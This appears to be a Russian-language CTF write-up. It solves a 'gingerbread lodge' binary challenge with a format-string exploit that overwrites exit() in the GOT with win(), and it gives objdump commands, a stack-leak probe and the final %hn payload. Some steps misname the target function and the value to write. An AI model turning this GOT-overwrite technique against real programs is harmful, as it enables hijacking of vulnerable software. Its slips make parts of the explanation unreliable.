# Ложа Тульского пряника

## Условие

Ежегодно на нашу пряничную ярмарку приезжает Тайная Пряничная Ложа, они собираются в самом дальнем шатре.

Если хотите туда попасть, то вам нужно знать пароль. И нет, это не пряник и не самовар. Так что удачи вам попытать счастье.

Дам подсказку, в начале поприветствуете фразой 
>The well-known GingerbreadHub site


## Решение

Декомпилируем файл, видим функцию win, в которой присутствует наш необходимый флаг. Необходимо перенаправить поток выполнения программы. Для этого надо будет перезаписать адрес exit() в GOT адресом win() . Здесь есть 4 шага:
* Найдем адрес hello()
* Найдем адрес exit() в GOT
* Найдем смещение нашей строки в стеке
* Напишем правильную строку эксплойта

В начале найдем адреса функции exit - 0x0804b2a0 
> objdump -R ClubPryanikaFlag

Теперь найдем адреса функции win - 0x080491a6
> objdump -t ClubPryanikaFlag | grep win

Теперь, что касается позиции нашей строки, это четвертый параметр в стеке:
> AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.
> AAAA00000200.f7e1e620.080491e3.41414141.78383025.3830252e.30252e78.252e7838.2e783830.78383025.

Итак, наш эксплойт будет выглядеть так:
> \xa2\xb2\x04\x08\xa0\xb2\x04\x08%<val1>x%4$hn%<val2>x%5$hn

Нам нужно вычислить значение, исходя из того, что нам нужно написать 0x0804b2a0:
    Младшие байты = 91a6 (37286 в десятичном формате).
    Старшие байты = 0804 (2052 в десятичном формате).
Однако старший байт уступает младшему, поэтому сначала мы напишем старший. Нам просто нужно инвертировать адреса, куда мы хотим писать:
    Старшие байты = 0804 (2052 в десятичном формате). Минус 8 байт для адресов = 2044.
    Младшие байты = 91a6 (37286 в десятичном формате). Минус 2052 байта, которые мы уже написали = 35234.

Вот эксплойт, который нужно вести во второй ввод:
> \xa2\xb2\x04\x08\xa0\xb2\x04\x08%2044x%4$hn%35234x%5$hn

## Flag ```TulaCTF{Da_Zdravstvuet_Tula_Da_Zdravstvuet_71}```


